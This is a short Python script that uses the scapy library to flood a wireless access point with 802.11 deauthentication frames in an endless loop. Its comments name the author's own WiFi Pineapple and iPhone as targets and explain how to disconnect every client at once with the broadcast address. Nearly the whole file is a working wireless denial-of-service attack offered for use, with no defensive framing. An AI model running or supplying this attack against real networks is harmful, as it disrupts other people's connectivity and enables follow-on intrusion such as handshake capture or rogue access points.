# Ver 1.0 Python 3.7 - Windows 10 OS
# This code Requires installation of scapy and winpcap
# Scapy - https://github.com/secdev/scapy This can be made easy if you're using the pycharm IDE - right-clicking on
# your import scapy statement and selecting install
# WinPcap - https://www.winpcap.org/install/default.htm

from scapy.all import *
import sys

"""
if len(sys.argv) != 5:
    print(sys.argv)
    print('Usage is ./scapy-deauth.py interface bssid client count')
    print('Example - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50')
    sys.exit(1)
"""

# # The interface that you want to send packets out of, needs to be set to monitor mode
# # should be global variable
conf.iface = "wlan0mon"  # This can be found in the Scapy Console via the command IFACES

# should be global variable
bssid = "00:12:34:55:AB:12"  # The BSSID of Wireless Access Point - This is the MAC of my WiFi PineApple

# Change the client to FF:FF:FF:FF:FF:FF if you want to deauth all stations on AP
# should come from grey list and black list
client= "60:A4:D0:2C:6E:A2"  # The MAC of the client to boot off Wifi - This is the MAC of my Iphone7

# count = 5  # The number of deauth packets you want to send

# turn off output
conf.verb = 0

packet = scapy.all.RadioTap()/scapy.all.Dot11(addr1=bssid, addr2=client, addr3=client)/scapy.all.Dot11Deauth()

# for n in range(int(count)):
while True:
    sendp(packet, monitor = True)
    #print('Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client)
